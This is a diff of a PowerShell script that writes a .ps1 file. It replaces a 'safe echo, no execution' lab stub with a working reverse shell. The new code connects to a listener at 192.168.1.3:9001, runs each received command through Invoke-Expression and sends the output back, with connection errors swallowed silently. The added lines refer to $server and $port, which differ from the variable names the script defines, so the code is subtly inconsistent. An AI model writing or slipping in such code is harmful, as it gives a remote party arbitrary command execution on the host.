@@ -7,22 +7,24 @@ $serverIP = '192.168.1.3'  # Lab listener IP
 $serverPort = 9001           # Lab listener port
 
 try {
-    $c = New-Object Net.Sockets.TCPClient($serverIP, $serverPort)
-    $s = $c.GetStream()
-    [byte[]]$b = 0..65535 | % {0}
+    $client = New-Object System.Net.Sockets.TCPClient($server, $port)
+    $stream = $client.GetStream()
+    $writer = New-Object System.IO.StreamWriter($stream)
+    $writer.AutoFlush = $true
 
-    while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {
-        $d = ([Text.Encoding]::ASCII).GetString($b, 0, $i)
-        # Safe echo, no execution
-        $r2 = "Executed safely in lab: $d PS " + (pwd).Path + "> "
-        $s.Write(([Text.Encoding]::ASCII).GetBytes($r2), 0, $r2.Length)
-        $s.Flush()
+    while ($client.Connected) {
+        $data = New-Object byte[] 1024
+        $bytes = $stream.Read($data, 0, $data.Length)
+        if ($bytes -gt 0) {
+            $command = (New-Object System.Text.ASCIIEncoding).GetString($data, 0, $bytes)
+            $output = Invoke-Expression $command 2>&1 | Out-String
+            $writer.WriteLine($output)
+        }
     }
-
-    $c.Close()
 } catch {
-    # silently ignore connection errors
+    
 }
+
 '@
 
 Set-Content -Path $ps1Path -Value $ps1Content -Force
